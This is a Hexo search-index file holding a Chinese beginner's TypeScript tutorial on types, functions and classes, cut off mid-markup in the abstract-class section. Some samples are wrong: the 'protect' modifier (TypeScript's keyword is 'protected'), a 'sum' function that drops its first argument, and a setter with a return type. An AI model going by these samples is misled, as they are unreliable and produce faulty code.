<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>TypeScript入门教程</title>
      <link href="/TypeScript%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html"/>
      <url>/TypeScript%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文是博主在学习TypeScript时跟着官方文档，自己写的例子，便于对知识点的掌握、梳理。</p></blockquote><h1 id="基础类型"><a href="#基础类型" class="headerlink" title="基础类型"></a>基础类型</h1><p>在Javascript中，声明的变量在被赋值前可以是任何数据类型，TypeScript中对变量的数据类型做了校验，一旦设置了指定的类型，变量就不能再被赋值其他类型的数据，这样更便于后期对变量的维护和查错。</p><h2 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> flag: boolean = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><h2 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num1: number = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">let</span> num2: number = <span class="number">0xf00d</span>;</span><br><span class="line"><span class="keyword">let</span> num3: number = <span class="number">0b1010</span>;</span><br><span class="line"><span class="keyword">let</span> num4: number = <span class="number">0o744</span>;</span><br></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str: string = <span class="string">'Hello'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> age: number = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> info: string = <span class="string">`I'm <span class="subst">$&#123;age&#125;</span> years old`</span>;</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> list1: number[] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> list2: <span class="built_in">Array</span>&lt;number&gt; = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br></pre></td></tr></table></figure><h2 id="元组-Tuple"><a href="#元组-Tuple" class="headerlink" title="元组 Tuple"></a>元组 Tuple</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x: [string, number];</span><br><span class="line">x = [<span class="string">'hello'</span>, <span class="number">10</span>];</span><br></pre></td></tr></table></figure><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>默认情况下，从0开始为元素编号，但可以手动给编号，也可以通过编号获得他的名字<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">enum Flag1 &#123; success, fail &#125;</span><br><span class="line"><span class="keyword">let</span> flag1:Flag1 = Flag1.fail;</span><br><span class="line"></span><br><span class="line">enum Flag2 &#123; success = <span class="number">1</span>, fail &#125;</span><br><span class="line"><span class="keyword">let</span> flag2:Flag2 = Flag2.fail;</span><br><span class="line"></span><br><span class="line">enum Flag3 &#123; success = <span class="number">1</span>, fail = <span class="number">3</span> &#125;</span><br><span class="line"><span class="keyword">let</span> flag3:Flag3 = Flag3.fail;</span><br><span class="line"></span><br><span class="line">enum Flag4 &#123; success, fail &#125;</span><br><span class="line"><span class="keyword">let</span> flag4: string = Flag4[<span class="number">1</span>];</span><br></pre></td></tr></table></figure></p><h2 id="任意值"><a href="#任意值" class="headerlink" title="任意值"></a>任意值</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> notSure: any = <span class="number">4</span>;</span><br><span class="line">notSure = <span class="string">"maybe a string instead"</span>;</span><br><span class="line">notSure = <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><h2 id="空值"><a href="#空值" class="headerlink" title="空值"></a>空值</h2><p>用于函数时，指函数没有返回值；用于变量时，变量只能被赋值null或undefined<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">warnUser</span>(<span class="params"></span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">  alert(<span class="string">"This is my warning message"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> unusable: <span class="keyword">void</span> = <span class="literal">undefined</span>;</span><br></pre></td></tr></table></figure></p><h2 id="Null-和-Undefined"><a href="#Null-和-Undefined" class="headerlink" title="Null 和 Undefined"></a>Null 和 Undefined</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> u: <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> n: <span class="literal">null</span> = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><h2 id="Never"><a href="#Never" class="headerlink" title="Never"></a>Never</h2><p>表示的是那些永不存在的值的类型。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params">message: string</span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h2><p>相当于其他语言中的类型转换。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> someValue: <span class="built_in">any</span> = <span class="string">"this is a string"</span>;</span><br><span class="line"><span class="keyword">let</span> strLength: <span class="built_in">number</span> = (&lt;<span class="built_in">string</span>&gt;someValue).length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> someValue: <span class="built_in">any</span> = <span class="string">"this is a string"</span>;</span><br><span class="line"><span class="keyword">let</span> strLength: <span class="built_in">number</span> = (someValue <span class="keyword">as</span> <span class="built_in">string</span>).length;</span><br></pre></td></tr></table></figure></p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;name&#125;</span>--<span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> getInfo2 = <span class="function"><span class="keyword">function</span>(<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;name&#125;</span>--<span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 书写完整函数类型</span></span><br><span class="line"><span class="keyword">var</span> getInfo3: <span class="function">(<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">string</span> = <span class="function"><span class="keyword">function</span>(<span class="params">a: <span class="built_in">string</span>, b: <span class="built_in">number</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;a&#125;</span>--<span class="subst">$&#123;b&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h2><p>可选参数必须放在参数最后面。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getDetail2 = <span class="function"><span class="keyword">function</span>(<span class="params">name: <span class="built_in">string</span>, age?: <span class="built_in">number</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;name&#125;</span>--<span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line">getDetail2(<span class="string">'Bob'</span>);</span><br></pre></td></tr></table></figure></p><h2 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h2><p>与普通可选参数不同的是，带默认值的参数不需要放在必须参数的后面。 如果带默认值的参数出现在必须参数前面，用户必须明确的传入undefined值来获得默认值。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTest</span>(<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span> = 20</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;name&#125;</span>--<span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line">getTest(<span class="string">'Bob'</span>);</span><br><span class="line"></span><br><span class="line">function getTest2(name: string = 'Bob', age: number): string &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;name&#125;</span>--<span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line">getTest2(<span class="literal">undefined</span>, <span class="number">13</span>);</span><br></pre></td></tr></table></figure></p><h2 id="剩余参数"><a href="#剩余参数" class="headerlink" title="剩余参数"></a>剩余参数</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span> (<span class="params">a: <span class="built_in">number</span>, ...res: <span class="built_in">number</span>[]</span>): <span class="title">number</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">  res.map(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    sum += item;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testInfo</span> (<span class="params">name:<span class="built_in">string</span></span>):<span class="title">string</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testInfo</span> (<span class="params">age:<span class="built_in">number</span></span>):<span class="title">string</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testInfo</span> (<span class="params">str:<span class="built_in">any</span></span>):<span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> str === <span class="string">'string'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`Name:<span class="subst">$&#123;str&#125;</span>`</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`Age:<span class="subst">$&#123;str&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testInfo2</span> (<span class="params">name:<span class="built_in">string</span></span>):<span class="title">string</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testInfo2</span> (<span class="params">name:<span class="built_in">string</span>, age:<span class="built_in">number</span></span>):<span class="title">string</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testInfo2</span> (<span class="params">name:<span class="built_in">any</span>, age?:<span class="built_in">any</span></span>):<span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (age) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`Name:<span class="subst">$&#123;name&#125;</span>,Age:<span class="subst">$&#123;age&#125;</span>`</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`Name:<span class="subst">$&#123;name&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Person &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  run (): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Name:<span class="subst">$&#123;this.name&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  getName (): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">  setName (name: <span class="built_in">string</span>): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person(<span class="string">'Amy'</span>);</span><br><span class="line">p.setName(<span class="string">'David'</span>)</span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Human &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  run (): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`Name:<span class="subst">$&#123;this.name&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> Tiny <span class="keyword">extends</span> Human &#123;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">super</span>(name);</span><br><span class="line">  &#125;</span><br><span class="line">  work () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Hello,<span class="subst">$&#123;this.name&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> t = <span class="keyword">new</span> Tiny(<span class="string">'Wang'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(t.run())</span><br><span class="line">t.work();</span><br></pre></td></tr></table></figure><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><ul><li>public：当前类，子类和外部均可访问</li><li>protect: 当前类，子类可访问，外部不可访问</li><li>private: 只在当前类可访问，子类和外部都不可访问<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Person &#123;</span><br><span class="line">  <span class="keyword">public</span> name: <span class="built_in">string</span>;</span><br><span class="line">  protect age: <span class="built_in">number</span>;</span><br><span class="line">  <span class="keyword">private</span> gender: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span>, gender: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age;</span><br><span class="line">    <span class="keyword">this</span>.gender = gender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Adult <span class="keyword">extends</span> Person&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span>, gender: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">super</span>(name, age, gender);</span><br><span class="line">  &#125;</span><br><span class="line">  print () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.gender); <span class="comment">// 报错，不能访问</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> Adult(<span class="string">'John'</span>, <span class="number">13</span>, <span class="string">'female'</span>);</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person(<span class="string">'John'</span>, <span class="number">13</span>, <span class="string">'female'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(a.name);</span><br><span class="line"><span class="built_in">console</span>.log(a.gender); <span class="comment">// 报错，不能访问</span></span><br><span class="line"><span class="built_in">console</span>.log(p.age); <span class="comment">// 报错，不能访问</span></span><br><span class="line"><span class="built_in">console</span>.log(p.gender); <span class="comment">// 报错，不能访问</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="readonly-修饰符"><a href="#readonly-修饰符" class="headerlink" title="readonly 修饰符"></a>readonly 修饰符</h2><p>使用readonly关键字将属性设置为只读的。 只读属性必须在声明时或构造函数里被初始化。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Person &#123;</span><br><span class="line">  readonly name: <span class="built_in">string</span>;</span><br><span class="line">  readonly age: <span class="built_in">number</span> = <span class="number">13</span>;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> Person(<span class="string">'John'</span>);</span><br><span class="line">p.name = <span class="string">'Bob'</span>; <span class="comment">// 报错，属性只读</span></span><br></pre></td></tr></table></figure></p><h2 id="存取器"><a href="#存取器" class="headerlink" title="存取器"></a>存取器</h2><p>只带有 get不带有 set的存取器自动被推断为 readonly。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Person &#123;</span><br><span class="line">  <span class="keyword">private</span> _name: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">get</span> name ():<span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">set</span> name (name: <span class="built_in">string</span>): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>._name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> Person();</span><br><span class="line">p.name = <span class="string">"Bob"</span>;</span><br><span class="line"><span class="keyword">if</span> (p.name) &#123;</span><br><span class="line">    alert(p.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="静态属性"><a href="#静态属性" class="headerlink" title="静态属性"></a>静态属性</h2><p>类的实例成员仅当类被实例化的时候才会被初始化。 创建类的静态成员，这些属性存在于类本身上面而不是类的实例上。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Base &#123;</span><br><span class="line">  <span class="keyword">public</span> name: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">static</span> age: <span class="built_in">number</span> = <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">  &#125;</span><br><span class="line">  run () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;this.name&#125;</span> is running`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  work () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;this.age&#125;</span> is working`</span>) <span class="comment">// 不能访问静态属性</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> print () &#123; <span class="comment">// 静态方法只能访问类的静态属性</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`This is static func:<span class="subst">$&#123;this.age&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> Base(<span class="string">'Amy'</span>);</span><br><span class="line">b.run();</span><br><span class="line"><span class="built_in">console</span>.log(Base.age); <span class="comment">// 可以访问</span></span><br><span class="line">Base.print(); <span class="comment">// 可以访问</span></span><br></pre></td></tr></table></figure></p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>继承类可以改写父类的方法。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> Human &#123;</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  run (): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`Name:<span class="subst">$&#123;this.name&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> Tiny <span class="keyword">extends</span> Human &#123;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">super</span>(name);</span><br><span class="line">  &#125;</span><br><span class="line">  run (): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`This is Tiny's Name:<span class="subst">$&#123;this.name&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> t = <span class="keyword">new</span> Tiny(<span class="string">'Wang'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(t.run()); <span class="comment">// This is Tiny's Name:Wang</span></span><br></pre></td></tr></table></figure></p><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>抽象类做为其它派生类的基类使用，一般不会直接被实例化。不同于接口，抽象类可以包含成员的实现细节，abstract关键字是用于定义抽象类和在抽象类内部定义抽象方法。<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> Animal &#123;</span><br><span class="line">  <span class="keyword">public</span> name: <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">abstract</span> eat():<span class="built_in">any</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Rabbit <span class="keyword">extends</span> Animal &#123;</span><br><span class="line">  <span class="comment">// 抽象类子类必须实现抽象方法</span></span><br><span class="line">  <span class="keyword">constructor</span> (<span class="params">name:<span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="keyword">super</span>(name);</span><br><span class="line">  &#125;</span><br><span class="line">  eat () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;this.name&#125;</span> eat grass`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  jump () &#123;</span><br><span class="line">    <span 